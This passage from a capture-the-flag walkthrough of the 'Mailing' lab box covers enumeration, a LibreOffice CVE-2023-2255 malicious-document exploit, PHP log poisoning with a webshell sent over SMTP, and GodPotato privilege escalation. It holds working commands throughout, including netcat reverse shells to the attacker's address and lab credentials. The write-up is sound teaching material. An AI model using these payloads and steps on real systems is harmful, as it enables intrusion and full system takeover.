d-r---         3/14/2024   3:24 PM                Program Files (x86)
d-r---          3/3/2024   4:19 PM                Users
d-----         4/29/2024   6:58 PM                Windows
d-----         4/12/2024   5:54 AM                wwwroot

```

`wwwroot` not in `inetpub` is a bit weird. maya can’t access `wwwroot`, and `inetpub` has the default IIS start pages:

```
*Evil-WinRM* PS C:\inetpub\wwwroot> ls

    Directory: C:\inetpub\wwwroot

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/28/2024   8:50 PM                aspnet_client
-a----         2/28/2024   8:49 PM            696 iisstart.htm
-a----         2/28/2024   8:49 PM          98757 iisstart.png
-a----          3/3/2024   4:19 PM           1983 index.aspx
-a----          3/3/2024   4:20 PM            108 web.config

```

`Important Documents` is an unusual folder. It’s empty. maya is able to write there:

```
*Evil-WinRM* PS C:\Important Documents> echo "this is a test" > text.txt
*Evil-WinRM* PS C:\Important Documents> ls

    Directory: C:\Important Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/6/2024   8:19 PM             34 text.txt

```

The directory is being cleaned up on a scheduled task, as a couple minutes later it’s gone.

#### SMB

Looking at SMB shares as maya, there’s one called `Important Documents`:

```

oxdf@hacky$ netexec smb mailing.htb -u maya -p m4y4ngs4ri --shares
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
SMB         10.10.11.14     445    MAILING          [*] Enumerated shares
SMB         10.10.11.14     445    MAILING          Share           Permissions     Remark
SMB         10.10.11.14     445    MAILING          -----           -----------     ------
SMB         10.10.11.14     445    MAILING          ADMIN$                          Admin remota
SMB         10.10.11.14     445    MAILING          C$                              Recurso predeterminado
SMB         10.10.11.14     445    MAILING          Important Documents READ            
SMB         10.10.11.14     445    MAILING          IPC$            READ            IPC remota

```

It shows READ access (though this is a bug, it’s actually READ and WRITE). Connecting to it shows it’s the same folder as at the filesystem root:

```

oxdf@hacky$ smbclient '//10.10.11.14/important documents' --user maya --password m4y4ngs4ri
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May  6 14:33:02 2024
  ..                                  D        0  Mon May  6 14:33:02 2024
  text.txt                            A       34  Mon May  6 14:33:02 2024

                8067583 blocks of size 4096. 1012498 blocks available

```

#### Programs

There’s a bunch of programs installed in `C:\Program Files`:

```
*Evil-WinRM* PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/27/2024   5:30 PM                Common Files
d-----          3/3/2024   4:40 PM                dotnet
d-----          3/3/2024   4:32 PM                Git
d-----         4/29/2024   6:54 PM                Internet Explorer
d-----          3/4/2024   6:57 PM                LibreOffice
d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
d-----         2/27/2024   4:58 PM                MSBuild
d-----         2/27/2024   5:30 PM                OpenSSL-Win64
d-----         3/13/2024   4:49 PM                PackageManagement
d-----         2/27/2024   4:58 PM                Reference Assemblies
d-----         3/13/2024   4:48 PM                RUXIM
d-----         2/27/2024   4:32 PM                VMware
d-----          3/3/2024   5:13 PM                Windows Defender
d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection
d-----          3/3/2024   5:13 PM                Windows Mail
d-----          3/3/2024   5:13 PM                Windows Media Player
d-----         4/29/2024   6:54 PM                Windows Multimedia Platform
d-----         2/27/2024   4:26 PM                Windows NT
d-----          3/3/2024   5:13 PM                Windows Photo Viewer
d-----         4/29/2024   6:54 PM                Windows Portable Devices
d-----         12/7/2019  10:31 AM                Windows Security
d-----         3/13/2024   4:49 PM                WindowsPowerShell

```

`LibreOffice` jumps out as interesting and non-standard. The version is 7.4.0.1:

```
*Evil-WinRM* PS C:\Program Files\LibreOffice\program> type version.ini
[Version]
AllLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia ckb cs cy da de dgo dsb dz el en-GB en-ZA eo es et eu fa fi fr fur fy ga gd gl gu gug he hsb hi hr hu id is it ja ka kab kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ szl ta te tg th tn tr ts tt ug uk uz ve vec vi xh zh-CN zh-TW zu
buildid=43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
ExtensionUpdateURL=https://updateexte.libreoffice.org/ExtensionUpdateService/check.Update
MsiProductVersion=7.4.0.1
ProductCode={A3C6520A-E485-47EE-98CC-32D6BB0529E4}
ReferenceOOoMajorMinor=4.1
UpdateChannel=
UpdateID=LibreOffice_7_en-US_af_am_ar_as_ast_be_bg_bn_bn-IN_bo_br_brx_bs_ca_ca-valencia_ckb_cs_cy_da_de_dgo_dsb_dz_el_en-GB_en-ZA_eo_es_et_eu_fa_fi_fr_fur_fy_ga_gd_gl_gu_gug_he_hsb_hi_hr_hu_id_is_it_ja_ka_kab_kk_km_kmr-Latn_kn_ko_kok_ks_lb_lo_lt_lv_mai_mk_ml_mn_mni_mr_my_nb_ne_nl_nn_nr_nso_oc_om_or_pa-IN_pl_pt_pt-BR_ro_ru_rw_sa-IN_sat_sd_sr-Latn_si_sid_sk_sl_sq_sr_ss_st_sv_sw-TZ_szl_ta_te_tg_th_tn_tr_ts_tt_ug_uk_uz_ve_vec_vi_xh_zh-CN_zh-TW_zu
UpdateURL=https://update.libreoffice.org/check.php
UpgradeCode={4B17E523-5D91-4E69-BD96-7FD81CFA81BB}
UpdateUserAgent=<PRODUCT> (${buildid}; ${_OS}; ${_ARCH}; <OPTIONAL_OS_HW_DATA>)
Vendor=The Document Foundation

```

### CVE-2023-2255

#### Identify

Searching for vulnerabilities that might apply to this version of LibreOffice leads to [CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255):

> Improper access control in editor components of The Document Foundation LibreOffice allowed an attacker to craft a document that would cause external links to be loaded without prompt. In the affected versions of LibreOffice documents that used “floating frames” linked to external files, would load the contents of those frames without prompting the user for permission to do so. This was inconsistent with the treatment of other linked content in LibreOffice. This issue affects: The Document Foundation LibreOffice 7.4 versions prior to 7.4.7; 7.5 versions prior to 7.5.3.

This doesn’t read like RCE, but it is!

#### POC

[This POC](https://github.com/elweth-sec/CVE-2023-2255) from elweth-sec will generate a document that will execute code on open. The Python script is very simple:

![image-20240506154920470](/img/image-20240506154920470.png)

[Lines 14-15](https://github.com/elweth-sec/CVE-2023-2255/blob/main/CVE-2023-2255.py#L14-L15) open the `test.odt` document as a Zip archive. [Then](https://github.com/elweth-sec/CVE-2023-2255/blob/main/CVE-2023-2255.py#L17-L19) it reads `content.xml`, and [modifies it](https://github.com/elweth-sec/CVE-2023-2255/blob/main/CVE-2023-2255.py#L21-L22) replacing “PAYLOAD” with the given command (after URL-encoding spaces). The rest is just putting the `.odt` file back together, saving it, and cleanup.

Looking at `content.xml`, there’s a `<script>` reference “PAYLOAD” in it:

[![image-20240506155342266](/img/image-20240506155342266.png)*Click for full size image*](/img/image-20240506155342266.png)

It’s going to run an in-line macro one this is loaded.

#### RCE

I’ll generate a payload:

```

oxdf@hacky$ python /opt/CVE-2023-2255/CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.6 443' --output exploit.odt
File exploit.odt has been created !

```

This is going to run `nc64.exe` from `C:\ProgramData` to returns a reverse shell.

I’ll upload the malicious document to the SMB share:

```

oxdf@hacky$ smbclient '//10.10.11.14/important documents' --user maya --password m4y4ngs4ri
Try "help" to get a list of possible commands.
smb: \> put exploit.odt 
putting file exploit.odt as \exploit.odt (61.8 kb/s) (average 61.8 kb/s)

```

And `nc64.exe`:

```

smb: \> put /opt/nc.exe/nc64.exe nc64.exe
putting file /opt/nc.exe/nc64.exe as \nc64.exe (69.5 kb/s) (average 66.2 kb/s)

```

From the shell as maya, I’ll move it to `ProgramData`:

```
*Evil-WinRM* PS C:\programdata> copy "\Important Documents\nc64.exe" nc64.exe

```

After a minute or two, I’ll get a shell at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.14 57717
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program> whoami
mailing\localadmin

```

And I can read the `root.txt`:

```

C:\Users\localadmin\Desktop>type root.txt
59248161************************

```

## Beyond Root - Patched Unintended

### Overview

#### History

The box was [patched](https://app.hackthebox.com/machines/Mailing/changelog) on 15 May 2024, 11 days after release:

![image-20240905143132645](/img/image-20240905143132645.png)

There’s two issues in there. The first is an unintended `include` in the PHP web application that lead to log poisoning. The other is Windows Defender. I’ll show how the log poisoning works.

#### Issue

The original solvers did it an unintended way based on a mistake in the `download.php` file. The originally released file was meant to be an information leak, but the author used `include` instead of `get_file_contents`:

```

<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        include($file_path);
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>

```

If I check this code today, it shows `file_get_contents` where there is an `include` above.

The code does check that the file must exist, which eliminates attacks like [LFI2RCE via filter chains](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters). But if I can get a webshell on disk somewhere, I can get execution as the webservice, which has the `SeImpersonatePrivilege`, and thus can be a path to SYSTEM. The original solvers of Mailer used hMail log poisoning to get a payload onto Mailer and `include` it.

#### Map

To see how this path fits into the intended path:

```

flowchart TD;
    A[<a href='#identify-file-read'>File Read in download.php</a>]-->B(<a href='#recover-password-hash'>Read administrator hash</a>);
    B-->C(<a href='#recover-password'>Crack administrator password</a>);
    C-->D(<a href='#cve-2024-21413'>Phish maya w/\nCVE-2024-21413</a>);
    D-->F[<a href='#winrm'>Shell as Maya</a>];
    F-->G(<a href='#cve-2023-2255'>CVE-2023-2255</a>);
    G-->H[<a href='#rce'>Shell as localadmin</a>];
    H-->I[root.txt];
    A-->J(<a href='#poison-log'>Poison hMailServer logs</a>);
    J-->K[<a href='#shell-1'>Shell as defaultapppool</a>];
    K-->L(<a href='#godpotato'>GodPotato<a/>);
    L-->M[Shell as system];
    M-->I;
    
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 7,8,9,10,11,13 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### Identify Log Location

Some searching for hMailServer Logs leads me eventually to [this forum post](https://www.hmailserver.com/forum/viewtopic.php?t=11690):

![image-20240506163921534](/img/image-20240506163921534.png)

I’ll try today’s date at `/download.php?file=../../progra~2/hmailserver/logs/hmailserver_2024-05-06.log`, and it works, downloading it as a text file:

![image-20240506164055770](/img/image-20240506164055770.png)

Everything sent seems to be logged! That’s good news!

### Poison Log

#### POC

To test this, I’ll connect with telnet and put PHP in the `HELO` string:

```

oxdf@hacky$ telnet mailing.htb 25
Trying 10.10.11.14...
Connected to mailing.htb.
Escape character is '^]'.
220 mailing.htb ESMTP
‍HELO <?php echo "0xdf was here!"; ?>
250 Hello.

```

I can exit this terminal with Ctrl-] and then “quit”.

I’ll redownload the file, and it worked!

![image-20240506164243980](/img/image-20240506164243980.png)

#### WebShell

I’ll connect again, this time with a webshell in the `HELO` message:

```

oxdf@hacky$ telnet mailing.htb 25
Trying 10.10.11.14...
Connected to mailing.htb.
Escape character is '^]'.
220 mailing.htb ESMTP
‍HELO <?php system($_REQUEST['cmd']); ?>
250 Hello.

```

Now I can get the file with `curl`, adding `&cmd=whoami` to the end of the URL:

```

oxdf@hacky$ curl 'mailing.htb/download.php?file=../../progra~2/hmailserver/logs/hmailserver_2024-05-06.log&cmd=whoami'
...[snip]...
"DEBUG" 4036    "2024-05-06 19:40:54.988"       "TCP connection started for session 55"
"SMTPD" 4036    55      "2024-05-06 19:40:54.988"       "10.10.14.6"    "SENT: 220 mailing.htb ESMTP"
"SMTPD" 4020    55      "2024-05-06 19:41:12.941"       "10.10.14.6"    "RECEIVED: HELO iis apppool\defaultapppool
"
"SMTPD" 4020    55      "2024-05-06 19:41:12.941"       "10.10.14.6"    "SENT: 250 Hello."

```

At the very bottom of the file is “iis apppool\defaultapppool”, the output of `whoami`.

#### Shell

I’ll use the `nc64.exe` I already have on target to get a shell:

```

oxdf@hacky$ curl 'mailing.htb/download.php?file=../../progra~2/hmailserver/logs/hmailserver_2024-09-05.log&cmd=\programdata\nc64.exe+10.10.14.6+443+-e+cmd.exe'

```

This hangs, but at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.14 53807
Microsoft Windows [Versin 10.0.19045.4355]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\wwwroot>whoami
iis apppool\defaultapppool

```

### GodPotato

#### Enumeration

The shell as defaultapppool has `SeImpersonatePrivilege`:

```

C:\wwwroot>whoami /priv

INFORMACIN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripcin                                       Estado       
============================= ================================================= =============
SeAssignPrimaryTokenPrivilege Reemplazar un smbolo (token) de nivel de proceso Deshabilitado
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeAuditPrivilege              Generar auditoras de seguridad                   Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobacin de recorrido                  Habilitada   
SeUndockPrivilege             Quitar equipo de la estacin de acoplamiento      Deshabilitado
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticacin      Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
SeTimeZonePrivilege           Cambiar la zona horaria                           Deshabilitado

```

It’s a bit tricky in Spanish, but it’s “Habilitada”, which means permitted.

#### GodPotato

The latest tool to abuse `SeImpersonatePrivilege` is [GodPotato](https://github.com/BeichenDream/GodPotato). I’ll download the latest release and upload it to Mailing, moving it to `c:\programdata`. Now I just run it, with `nc64.exe` again:

```

C:\ProgramData>.\gp.exe -cmd "\programdata\nc64.exe -e cmd.exe 10.10.14.6 443"
.\gp.exe -cmd "\programdata\nc64.exe -e cmd.exe 10.10.14.6 443"
[*] CombaseModule: 0x140732587507712
[*] DispatchTable: 0x140732589954472
[*] UseProtseqFunction: 0x140732589289184
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\db5ede65-43e3-48ba-9d45-dbdf1a9b0155\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000a002-0fe8-ffff-e197-fb2f57140d2b
[*] DCOM obj OXID: 0x3c11eb5f65caaaba
[*] DCOM obj OID: 0x41b53d5529b45e67
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 908 Token:0x820  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 6156

```

It hangs here, but at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.14 51478
Microsoft Windows [Versin 10.0.19045.4355]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\ProgramData>whoami
nt authority\system

```

As SYSTEM, I have full control over the computer, including reading `root.txt`.